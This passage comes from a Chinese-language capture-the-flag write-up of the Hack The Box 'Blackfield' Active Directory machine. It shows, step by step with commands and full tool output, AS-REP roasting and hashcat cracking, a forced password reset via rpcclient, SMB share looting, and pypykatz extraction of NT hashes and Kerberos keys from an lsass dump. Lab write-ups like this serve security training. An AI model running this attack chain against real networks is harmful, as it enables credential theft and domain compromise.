[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                           
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)                                                                                                                     
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                       
$krb5asrep$23$support@BLACKFIELD.LOCAL:492c64a5702e86fc6751991c0aaf9341$e3ca0d1acd8dc58179c15c7cb62d06ecbc0ecd097b2bb0cc9d10b4f83b17625a37abc40a0ee59e9f06f9586fd37dd45e1302464a9e1c14cfc029db1a27572cf8e7cac19aaf
4f694e3efe5e0a11a0d1e9cf965011b6eabd88ab3b684cc38af7fdc4e926361dd3f1c46e09156b2f87e40228fa1b75ff7556b1a9695ed480e8f291f4aa52b5b4da279dfefc88b4341ba639177d0e3a35cf94b4479d18e2971e59399fe9706cc16465bc3e31b9452931
ebcc43b322f95f2f01911ba1f5d732595cb41b8c38be1c78ad720b2e748eea49adf93956cc08a7e9102ce500f06fb0854cbcc6895dd6120781e26732ff2dfeb0c19e09647514                                                                      
[-] User BLACKFIELD764430 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD538365 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD189208 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD404458 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD706381 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD937395 doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                                                                
[-] User BLACKFIELD553715 doesn't have UF_DONT_REQUIRE_PREAUTH set

...
...
```

得到用户 support 的 hash，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ vim Directory/support_hash.txt
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat Directory/support_hash.txt  
$krb5asrep$23$support@BLACKFIELD.LOCAL:492c64a5702e86fc6751991c0aaf9341$e3ca0d1acd8dc58179c15c7cb62d06ecbc0ecd097b2bb0cc9d10b4f83b17625a37abc40a0ee59e9f06f9586fd37dd45e1302464a9e1c14cfc029db1a27572cf8e7cac19aaf
4f694e3efe5e0a11a0d1e9cf965011b6eabd88ab3b684cc38af7fdc4e926361dd3f1c46e09156b2f87e40228fa1b75ff7556b1a9695ed480e8f291f4aa52b5b4da279dfefc88b4341ba639177d0e3a35cf94b4479d18e2971e59399fe9706cc16465bc3e31b9452931
ebcc43b322f95f2f01911ba1f5d732595cb41b8c38be1c78ad720b2e748eea49adf93956cc08a7e9102ce500f06fb0854cbcc6895dd6120781e26732ff2dfeb0c19e09647514 
```

执行 hashcat 爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ hashcat -m 18200 Directory/support_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashfile 'Directory/support_hash.txt' on line 2 (e09156...0781e26732ff2dfeb0c19e09647514  ): Separator unmatched
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (28075 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:492c64a5702e...d3f1c4
Time.Started.....: Mon Apr 27 03:38:52 2026 (4 secs)
Time.Estimated...: Mon Apr 27 03:38:56 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3528.3 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 67%

Started: Mon Apr 27 03:38:52 2026
Stopped: Mon Apr 27 03:38:58 2026
```

爆破失败，检查一下 hash 的完整性，发现格式不对。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat -A Directory/support_hash.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:492c64a5702e86fc6751991c0aaf9341$e3ca0d1acd8dc58179c15c7cb62d06ecbc0ecd097b2bb0cc9d10b4f83b17625a37abc40a0ee59e9f06f9586fd37dd45e1302464a9e1c14cfc029db1a27572cf8e7cac19aaf4f694e3efe5e0a11a0d1e9cf965011b6eabd88ab3b684cc38af7fdc4e926361dd3f1c46$
e09156b2f87e40228fa1b75ff7556b1a9695ed480e8f291f4aa52b5b4da279dfefc88b4341ba639177d0e3a35cf94b4479d18e2971e59399fe9706cc16465bc3e31b9452931ebcc43b322f95f2f01911ba1f5d732595cb41b8c38be1c78ad720b2e748eea49adf93956cc08a7e9102ce500f06fb0854cbcc6895dd6120781e26732ff2dfeb0c19e09647514  $
```

将用户 support 提取出来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ vim Directory/support_user.txt
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat Directory/support_user.txt   
support

```

单独执行 GetUsers 并保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.229.17 BLACKFIELD.local/ -usersfile Directory/support_user.txt > Directory/support_hash.txt
                                                                                                                               
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat Directory/support_hash.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$support@BLACKFIELD.LOCAL:ab6d5e83f44020bc801074e793e87ab4$62e5bcef33e3ed7f0b5c388d41249952278d7121e9eb56e594ba49ea4445d7d23a918827e2c0978e1a49a7d8b7bacfd82f4be649212bc92c64a73aa1c4788a3bd0594333e35f2f406bf51f02513e66e401c41eb5a6ad5e38f309f1379d7c89ef4ab4bd1150a5120170c4fb316726eb410ac2fa10fc220474239059314f2b167eab959fff343012b995fa3789f9b403cd3503a4e14cffc1d752933cfe18cafb7cc88eff84af75d6fdf63f42388d8ded7a0bd6d6f575c7791b205e8a916e174a962d0cca0abf909074e3800560b23986e7851095303032844f0ae0715310a46dc86f37a486f6fa187f80132636d6e329e91f58d10a
```

修改一下格式

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ vim Directory/support_hash.txt 
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat Directory/support_hash.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:ab6d5e83f44020bc801074e793e87ab4$62e5bcef33e3ed7f0b5c388d41249952278d7121e9eb56e594ba49ea4445d7d23a918827e2c0978e1a49a7d8b7bacfd82f4be649212bc92c64a73aa1c4788a3bd0594333e35f2f406bf51f02513e66e401c41eb5a6ad5e38f309f1379d7c89ef4ab4bd1150a5120170c4fb316726eb410ac2fa10fc220474239059314f2b167eab959fff343012b995fa3789f9b403cd3503a4e14cffc1d752933cfe18cafb7cc88eff84af75d6fdf63f42388d8ded7a0bd6d6f575c7791b205e8a916e174a962d0cca0abf909074e3800560b23986e7851095303032844f0ae0715310a46dc86f37a486f6fa187f80132636d6e329e91f58d10a
```

再次爆破得到密码 `#00^BlackKnight`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ hashcat -m 18200 Directory/support_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (28046 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$support@BLACKFIELD.LOCAL:ab6d5e83f44020bc801074e793e87ab4$62e5bcef33e3ed7f0b5c388d41249952278d7121e9eb56e594ba49ea4445d7d23a918827e2c0978e1a49a7d8b7bacfd82f4be649212bc92c64a73aa1c4788a3bd0594333e35f2f406bf51f02513e66e401c41eb5a6ad5e38f309f1379d7c89ef4ab4bd1150a5120170c4fb316726eb410ac2fa10fc220474239059314f2b167eab959fff343012b995fa3789f9b403cd3503a4e14cffc1d752933cfe18cafb7cc88eff84af75d6fdf63f42388d8ded7a0bd6d6f575c7791b205e8a916e174a962d0cca0abf909074e3800560b23986e7851095303032844f0ae0715310a46dc86f37a486f6fa187f80132636d6e329e91f58d10a:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:ab6d5e83f440...58d10a
Time.Started.....: Mon Apr 27 03:44:32 2026 (4 secs)
Time.Estimated...: Mon Apr 27 03:44:36 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3574.6 kH/s (1.43ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14327808/14344385 (99.88%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: $Cah$ -> #!hrvert
Hardware.Mon.#01.: Util: 61%

Started: Mon Apr 27 03:44:32 2026
Stopped: Mon Apr 27 03:44:38 2026
```

执行 crackmapexec 验证 support 的权限，没有 winrm 的权限，但是有 smb 的权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ crackmapexec winrm 10.129.229.17 -u support -p '#00^BlackKnight'
SMB         10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.129.229.17   5985   DC01             [*] http://10.129.229.17:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.17   5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ crackmapexec smb 10.129.229.17 -u support -p '#00^BlackKnight'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```

用 nxc 枚举 support 的共享目录，发现 forensic 还是没有可读权限。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ crackmapexec smb 10.129.229.17 -u support -p '#00^BlackKnight'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares    
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

## 再次探索 SMB

之前在 smb 发现的目录 `profiles$` 还没进行审计，连接 smb 发现长得很像用户名，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ smbclient //10.129.229.17/profiles$ -U 'BLACKFIELD/support%#00^BlackKnight' -c 'ls' | tee Directory/profire_file.txt
...
...
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ cat Directory/profire_file.txt | awk -F ' ' '{print $1}' | tee Directory/guess_users.txt
...
...                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ head -n 20 Directory/guess_users.txt
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
AHigchens
AJaquemai
AKlado
AKoffenburger
AKollolli
AKruppe
AKubale
ALamerz
AMaceldon
AMasalunga
ANavay
ANesterova
```


## 提权为 AUDIT2020

### Bloodhound

使用 bloodhound-python 收集信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ bloodhound-python -c All -u support -p '#00^BlackKnight' -ns 10.129.229.17 -d BLACKFIELD.local --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Testing resolved hostname connectivity dead:beef::a8d5:2a02:3579:a252
INFO: Trying LDAP connection to dead:beef::a8d5:2a02:3579:a252
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Testing resolved hostname connectivity dead:beef::a8d5:2a02:3579:a252
INFO: Trying LDAP connection to dead:beef::a8d5:2a02:3579:a252
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 37S
INFO: Compressing output into 20260427044613_bloodhound.zip
```

浏览发现一条提权到 AUDIT2020 的路线。

![](Pasted%20image%2020260427165948.png)

ForceChangePassword 可以强制修改密码。

使用 rpcclient 连接 support，使用 setuserinfo2 修改 audit2020 的密码为 `P@ssword`

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17
rpcclient $> setuserinfo2 audit2020 23 'P@ssword'
```

验证是否修改成功。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:P@ssword
```

用 nxc 查看 audit2020 共享目录的权限，发现 forensic 可读。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:P@ssword 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

使用 smbclient 连接 forensic，尝试递归下载全部内容。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ smbclient //10.129.229.17/forensic -U 'BLACKFIELD/audit2020%P@ssword'
Try "help" to get a list of possible commands.
smb: \> prompt
smb: \> recurse
smb: \> mget *
getting file \commands_output\domain_admins.txt of size 528 as commands_output/domain_admins.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as commands_output/domain_groups.txt (2.4 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as commands_output/domain_users.txt (6.3 KiloBytes/sec) (average 5.2 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (106.3 KiloBytes/sec) (average 64.6 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (4.4 KiloBytes/sec) (average 61.8 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as commands_output/netstat.txt (4.6 KiloBytes/sec) (average 56.8 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as commands_output/route.txt (4.7 KiloBytes/sec) (average 52.6 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as commands_output/systeminfo.txt (10.9 KiloBytes/sec) (average 51.0 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as commands_output/tasklist.txt (25.3 KiloBytes/sec) (average 50.1 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
parallel_read returned NT_STATUS_IO_TIMEOUT
parallel_read returned NT_STATUS_IO_TIMEOUT
getting file \memory_analysis\conhost.zip of size 37876530 as memory_analysis/conhost.zip getting file \memory_analysis\ctfmon.zip of size 24962333 as memory_analysis/ctfmon.zip getting file \memory_analysis\dfsrs.zip of size 23993305 as memory_analysis/dfsrs.zip getting file \memory_analysis\dllhost.zip of size 18366396 as memory_analysis/dllhost.zip (976.4 KiloBytes/sec) (average 630.8 KiloBytes/sec)
getting file \memory_analysis\ismserv.zip of size 8810157 as memory_analysis/ismserv.zip (837.7 KiloBytes/sec) (average 684.5 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
parallel_read returned NT_STATUS_IO_TIMEOUT
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\RuntimeBroker.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\ServerManager.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\sihost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\smartscreen.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\svchost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\taskhostw.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\winlogon.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\wlms.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \memory_analysis\WmiPrvSE.zip
NT_STATUS_CONNECTION_DISCONNECTED listing \memory_analysis\*
NT_STATUS_CONNECTION_DISCONNECTED listing \tools\*
smb: \> getting file \memory_analysis\lsass.zip of size 41936098 as memory_analysis/lsass.zip getting file \memory_analysis\mmc.zip of size 64288607 as memory_analysis/mmc.zip The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED

                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ ls -liah            
total 20K
2768731 drwxrwxr-x 5 kali kali 4.0K Apr 27 05:11 .
2774977 drwxrwxr-x 5 kali kali 4.0K Apr 27 05:05 ..
2768826 drwxrwxr-x 2 kali kali 4.0K Apr 27 05:12 commands_output
2768827 drwxrwxr-x 2 kali kali 4.0K Apr 27 05:15 memory_analysis
2768828 drwxrwxr-x 2 kali kali 4.0K Apr 27 05:11 tools
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ tree
.
├── commands_output
│   ├── domain_admins.txt
│   ├── domain_groups.txt
│   ├── domain_users.txt
│   ├── firewall_rules.txt
│   ├── ipconfig.txt
│   ├── netstat.txt
│   ├── route.txt
│   ├── systeminfo.txt
│   └── tasklist.txt
├── memory_analysis
│   ├── conhost.zip
│   ├── ctfmon.zip
│   ├── dfsrs.zip
│   ├── dllhost.zip
│   ├── ismserv.zip
│   ├── lsass.zip
│   └── mmc.zip
└── tools

```

tools 的内容过大，先放一边，如果有需要再下载。

## 提权至 svc_backup

其中 isass 很可能存在有价值的信息。

由于 HTB VPN 的原因 zip 压缩包下载可能不完整，使用 smbget 重新下载。

```bash
┌──(kali㉿kali)-[~/…/Kali/Blackfield/smb_forensic/memory_analysis]
└─$ cd ..             
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ smbget -U 'BLACKFIELD/audit2020%P@ssword' -r smb://10.129.229.17/forensic/memory_analysis/lsass.zip
Using domain: BLACKFIELD, user: audit2020
smb://10.129.229.17/forensic/memory_analysis/lsass.zip                                                                                                                                                            
Downloaded 39.99MB in 74 seconds
                                                                                                                                                                                                                  

┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ ls -liah lsass.zip  
2768828 -rwxr-xr-x 1 kali kali 40M Apr 27 05:36 lsass.zip
```

解压得到 lsass.DMP。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ unzip -l lsass.zip 
Archive:  lsass.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
143044222  2020-02-23 11:02   lsass.DMP
---------                     -------
143044222                     1 file
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP               
                                                                                                                                                                                                                  

┌──(kali㉿kali)-[~/Work/Kali/Blackfield/smb_forensic]
└─$ ls -liah lsass.DMP 
2781568 -rw-rw-r-- 1 kali kali 137M Feb 23  2020 lsass.DMP
```

用 pypykatz dump lsass，并将结果保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ pypykatz lsa minidump lsass.DMP | tee ../lass.txt
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
		AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
		AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
